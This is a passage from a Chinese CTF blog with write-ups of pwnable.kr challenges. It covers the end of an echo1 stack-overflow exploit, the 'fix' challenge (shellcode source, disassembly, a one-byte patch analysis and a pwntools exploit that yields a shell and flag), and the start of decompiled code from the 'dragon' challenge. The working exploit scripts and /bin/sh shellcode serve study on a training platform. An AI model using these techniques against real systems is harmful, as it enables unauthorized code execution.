class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        r = process(<span class="string">'./echo1'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9010</span>)</span><br><span class="line">    </span><br><span class="line">    id_addr = <span class="number">0x6020a0</span></span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">' : '</span>)</span><br><span class="line">    r.sendline(asm(<span class="string">'jmp rsp'</span>))</span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.sendline(<span class="string">'a'</span>*<span class="number">0x28</span>+p64(id_addr)+asm(shellcraft.sh()))</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">work(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ python 1.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9010: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">hello \xff�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0 `</span><br><span class="line">goodbye \xff�</span><br><span class="line">$ </span><br><span class="line">$ ls</span><br><span class="line">echo1</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">H4d_som3_fun_w1th_ech0_ov3rfl0w</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单的栈溢出利用</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/02/27/pwnable.kr-fix/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/27/pwnable.kr-fix/" itemprop="url">
                  pwnable.kr-fix
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-27 22:46:00" itemprop="dateCreated datePublished" datetime="2018-02-27T22:46:00+08:00">2018-02-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/27/pwnable.kr-fix/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/27/pwnable.kr-fix/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/27/pwnable.kr-fix/" class="leancloud_visitors" data-flag-title="pwnable.kr-fix">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看似简单的改代码题，但是还是需要强大的汇编知识。花了很长时间，主要是自己对指令不是很熟悉。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先分析源码<code>fix.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php</span></span><br><span class="line"><span class="keyword">char</span> sc[] = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"</span></span><br><span class="line">		<span class="string">"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// a buffer we are about to exploit!</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// prepare shellcode on executable stack!</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buf, sc);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// overwrite return address!</span></span><br><span class="line">	*(<span class="keyword">int</span>*)(buf+<span class="number">32</span>) = buf;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"get shell\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"What the hell is wrong with my shellcode??????\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I just copied and pasted it from shell-storm.org :(\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can you fix it for me?\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tell me the byte index to be fixed : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(index &gt; <span class="number">22</span>)	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fix=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tell me the value to be patched : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;fix);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// patching my shellcode</span></span><br><span class="line">	sc[index] = fix;	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this should work..</span></span><br><span class="line">	shellcode();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序逻辑简单，如题目所说<code>shellcode</code>无法正确执行，但我们只能修改其中一个字节。看了<code>shellcode</code>函数，开始以为是地址布置出错，但是看了反汇编代码发现返回地址的计算没有错误，于是反汇编一下<code>shellcode</code>看看有没有问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.12 (default, Dec  4 2017, 14:50:18) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; a=&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&quot;</span><br><span class="line">&gt;&gt;&gt; a+=&quot;\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line">&gt;&gt;&gt; print disasm(a)</span><br><span class="line">   0:   31 c0                   xor    eax,eax</span><br><span class="line">   2:   50                      push   eax</span><br><span class="line">   3:   68 2f 2f 73 68          push   0x68732f2f</span><br><span class="line">   8:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">   d:   89 e3                   mov    ebx,esp</span><br><span class="line">   f:   50                      push   eax</span><br><span class="line">  10:   53                      push   ebx</span><br><span class="line">  11:   89 e1                   mov    ecx,esp</span><br><span class="line">  13:   b0 0b                   mov    al,0xb</span><br><span class="line">  15:   cd 80                   int    0x80</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
<p>仔细分析代码发现<code>shellcode</code>并没有问题，后来放在gdb调试的时候发现在执行<code>shellcode</code>的时候，<code>shellcode</code>的代码会变化。。这就很奇怪了，啥问题呢？仔细分析栈空间的排布就知道了，<code>shellcode</code>布置在栈中占了<code>23</code>个字节，<code>buf</code>变量的位置是<code>ebp-0x1c</code>（反汇编代码就能看出），所以<code>shellcode</code>尾部达到了<code>ebp-5</code>,然而函数返回执行<code>shellcode</code>时<code>esp</code>指向返回地址下面4个字节，这里相距<code>shellcode</code>有<code>13</code>字节，所以后续的<code>pop</code>操作只能执行3次，否则就会覆盖<code>shellcode</code>的部分代码，造成执行失败。<br>知道了失败的原因那么如何通过只修改一个字节达到执行成功的目的呢？这里确实得熟悉汇编指令才行，我的思路是修改<code>push eax</code>为<code>leave</code>指令（他们都是单子节指令），这样当执行到这里时就相当于执行了<code>mov esp，ebp;pop ebp</code>。于是栈顶就下降了后续的<code>pop</code>就不会修改<code>shellcode</code>了，但是这样的话<code>shellcode</code>虽然会正确执行但是会报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ ./fix</span><br><span class="line">What the hell is wrong with my shellcode??????</span><br><span class="line">I just copied and pasted it from shell-storm.org :(</span><br><span class="line">Can you fix it <span class="keyword">for</span> me?</span><br><span class="line">Tell me the byte index to be fixed : 15</span><br><span class="line">Tell me the value to be patched : 201</span><br><span class="line">get shell</span><br><span class="line">/bin//sh: 0: Can<span class="string">'t open ����</span></span><br><span class="line"><span class="string">                             P��c</span></span><br><span class="line"><span class="string">root@1:~/桌面/test$</span></span><br></pre></td></tr></table></figure></p>
<p>这说明我们已经成功执行<code>/bin/sh</code>了，但是似乎这样的修改增加<code>/bin/sh</code>的参数。确实如此，执行<code>leave</code>指令后，栈已经变了，就无法保证<code>ecx</code>指向的第二个字符串是0,所以可能就会多出别的参数。这里可以根据错误提示新建一个和错误提示的一样的文件，然后在里面写入<code>sh</code>，这样当再次执行程序时，就会试图执行这个文件的命令了。另外这个多出的参数由于是栈上的数据，而不是栈地址，所以它不具有随机性，所以这种方法可行而且实际上确实可行。下面贴出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">()</span>:</span></span><br><span class="line">    context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">    the_path = <span class="string">'/home/fix/fix'</span></span><br><span class="line">    r = process(the_path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#r.recvuntil("fixed : ")</span></span><br><span class="line">    r.sendline(<span class="string">"15"</span>)</span><br><span class="line">    <span class="comment">#r.recvuntil("patched : ")</span></span><br><span class="line">    r.sendline(<span class="string">"201"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'get shell\n'</span>)</span><br><span class="line">    error_text = r.recvline()</span><br><span class="line">    r.kill()</span><br><span class="line">    </span><br><span class="line">    a = error_text.find(<span class="string">'open '</span>)</span><br><span class="line">    fname = error_text[a+<span class="number">5</span>:<span class="number">-1</span>]</span><br><span class="line">    f = open(fname,<span class="string">'w'</span>)</span><br><span class="line">    f.write(<span class="string">'sh\n'</span>)</span><br><span class="line">    f.close()</span><br><span class="line">    </span><br><span class="line">    r = process(the_path)</span><br><span class="line">    r.sendline(<span class="string">"15"</span>)</span><br><span class="line">    r.sendline(<span class="string">"201"</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">work()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fix@ubuntu:/tmp$ python 1.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'/home/fix/fix'</span>: Done</span><br><span class="line">[*] Stopped program <span class="string">'/home/fix/fix'</span></span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'/home/fix/fix'</span>: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">What the hell is wrong with my shellcode??????</span><br><span class="line">I just copied and pasted it from shell-storm.org :(</span><br><span class="line">Can you fix it <span class="keyword">for</span> me?</span><br><span class="line">Tell me the byte index to be fixed : Tell me the value to be patched : get shell</span><br><span class="line">$ ls</span><br><span class="line">ls: cannot open directory <span class="string">'.'</span>: Permission denied</span><br><span class="line">$ <span class="built_in">cd</span> /home/fix</span><br><span class="line">$ ls</span><br><span class="line">fix  fix.c  flag  intended_solution.txt</span><br><span class="line">$ cat flag</span><br><span class="line">Sorry <span class="keyword">for</span> blaming shell-strom.org :) it was my ignorance!</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>注意要把exp上传题目平台执行</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽说是改代码的题，但是还是学到了很多。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/02/27/pwnable.kr-dragon/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/27/pwnable.kr-dragon/" itemprop="url">
                  pwnable.kr-dragon
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-27 17:37:30" itemprop="dateCreated datePublished" datetime="2018-02-27T17:37:30+08:00">2018-02-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/27/pwnable.kr-dragon/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/27/pwnable.kr-dragon/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/27/pwnable.kr-dragon/" class="leancloud_visitors" data-flag-title="pwnable.kr-dragon">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题找溢出找了半天，游戏也玩了半天，唉最后还是细心读代码找出了漏洞。这是一个c语言不同类型比较隐式转换导致的漏洞，还是有点意思的。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>放ida逆向一下，程序代码逻辑有点长，不过认真读的话还是能理解的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PlayGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight"</span>);</span><br><span class="line">      result = GetChoice();</span><br><span class="line">      <span class="keyword">if</span> ( result != <span class="number">1</span> &amp;&amp; result != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      FightDragon(result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( result != <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    SecretLevel();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">FightDragon</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// al@1</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// ST1C_4@10</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+10h] [bp-18h]@7</span></span><br><span class="line">  _DWORD *ptr; <span class="comment">// [sp+14h] [bp-14h]@1</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// [sp+18h] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  v1 = Count++;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    *((_BYTE *)v5 + <span class="number">8</span>) = <span class="number">80</span>;</span><br><span class="line">    *((_BYTE *)v5 + <span class="number">9</span>) = <span class="number">4</span>;</span><br><span class="line">    v5[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line">    *v5 = PrintMonsterInfo;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Mama Dragon Has Appeared!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    *((_BYTE *)v5 + <span class="number">8</span>) = <span class="number">50</span>;</span><br><span class="line">    *((_BYTE *)v5 + <span class="number">9</span>) = <span class="number">5</span>;</span><br><span class="line">    v5[<span class="number">3</span>] = <span class="number">30</span>;</span><br><span class="line">    *v5 = PrintMonsterInfo;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Baby Dragon Has Appeared!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *ptr = <span class="number">1</span>;</span><br><span class="line">    ptr[<span class="number">1</span>] = <span class="number">42</span>;</span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="number">50</span>;</span><br><span class="line">    ptr[<span class="number">3</span>] = PrintPlayerInfo;</span><br><span class="line">    v3 = PriestAttack((<span class="keyword">int</span>)ptr, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    *ptr = <span class="number">2</span>;</span><br><span class="line">    ptr[<span class="number">1</span>] = <span class="number">50</span>;</span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    ptr[<span class="number">3</span>] = PrintPlayerInfo;</span><br><span class="line">    v3 = KnightAttack((<span class="keyword">int</span>)ptr, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Well Done Hero! You Killed The Dragon!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The World Will Remember You As:"</span>);</span><br><span class="line">    v2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%16s"</span>, v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And The Dragon You Have Defeated Was Called:"</span>);</span><br><span class="line">    ((<span class="keyword">void</span> (__cdecl *)(_DWORD *))*v5)(v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nYou Have Been Defeated!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">PriestAttack</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    